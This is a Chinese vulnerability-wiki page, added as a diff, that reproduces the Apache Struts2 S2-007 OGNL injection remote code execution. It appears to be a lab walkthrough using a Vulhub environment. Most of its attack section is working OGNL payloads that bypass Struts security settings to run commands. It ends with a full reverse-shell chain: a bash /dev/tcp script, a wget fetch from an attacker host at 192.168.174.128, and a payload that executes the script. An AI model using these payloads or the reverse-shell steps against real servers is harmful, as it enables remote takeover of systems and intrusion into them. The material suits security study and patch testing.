@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Struts2%20S2-007%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache Struts2 S2-007 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache Struts2 S2-007 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-008 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache%20Struts2%20S2-005%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Apache%20Struts2%20S2-005%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-005 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-struts2-s2-007">Apache Struts2 S2-007 远程代码执行漏洞<a class="headerlink" href="#apache-struts2-s2-007" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>参考 <a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></p>
+<p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：</p>
+<div class="highlight"><pre><span></span><code>(...)
+public class UserAction extends ActionSupport {
+    private Integer age;
+    private String name;
+    private String email;
+
+(...)
+</code></pre></div>
+<p>然后配置有 UserAction-validation.xml：</p>
+<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;!DOCTYPE validators PUBLIC
+    &quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;
+    &quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;&gt;
+&lt;validators&gt;
+    &lt;field name=&quot;age&quot;&gt;
+        &lt;field-validator type=&quot;int&quot;&gt;
+            &lt;param name=&quot;min&quot;&gt;1&lt;/param&gt;
+            &lt;param name=&quot;max&quot;&gt;150&lt;/param&gt;
+        &lt;/field-validator&gt;
+    &lt;/field&gt;
+&lt;/validators&gt;
+</code></pre></div>
+<p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>"'" + value + "'"</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
+<p>因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload（<strong>弹计算器，无法在本项目环境下运行</strong>）：</p>
+<div class="highlight"><pre><span></span><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@java.lang.Runtime@getRuntime().exec(&quot;open /Applications/Calculator.app&quot;)) + &#39;
+</code></pre></div>
+<p>漏洞详情:</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-007.html">http://struts.apache.org/docs/s2-007.html</a></li>
+</ul>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>影响版本: 2.0.0 - 2.2.3</p>
+<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>Vulhub 执行以下命令启动 s2-007 测试环境：</p>
+<div class="highlight"><pre><span></span><code>docker-compose build
+docker-compose up -d
+</code></pre></div>
+<p>访问 <code>http://your-vps-ip:8080/index.jsp</code> 即可进入上传表单页面。</p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>执行任意代码的 EXP：</p>
+<div class="highlight"><pre><span></span><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;
+</code></pre></div>
+<p>将 Exp 传入可以利用的输入框（age），得到命令执行结果：</p>
+<p><img alt="image-20220301170152780" src="../images/202203011701833.png" /></p>
+<h3 id="shell">反弹 shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<p>编写 shell 脚本并启动 http 服务器：</p>
+<div class="highlight"><pre><span></span><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
+python3环境下：python -m http.server 80
+</code></pre></div>
+<p>上传 shell.sh 文件的命令为：</p>
+<div class="highlight"><pre><span></span><code>wget 192.168.174.128/shell.sh
+</code></pre></div>
+<p>上传 shell.sh 文件的 Payload 为：</p>
+<div class="highlight"><pre><span></span><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;wget 192.168.174.128/shell.sh&#39;).getInputStream())) + &#39;
+</code></pre></div>
+<p>执行 shell.sh 文件的命令为：</p>
+<div class="highlight"><pre><span></span><code>bash /usr/local/tomcat/shell.sh
+</code></pre></div>
+<p>执行 shell.sh 文件的 Payload 为：</p>
+<div class="highlight"><pre><span></span><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;bash /usr/local/tomcat/shell.sh&#39;).getInputStream())) + &#39;
+</code></pre></div>
+<p>成功接收反弹 shell：</p>
+<p><img alt="image-20220301170256417" src="../images/202203011702511.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-008 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache%20Struts2%20S2-005%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Apache%20Struts2%20S2-005%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-005 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
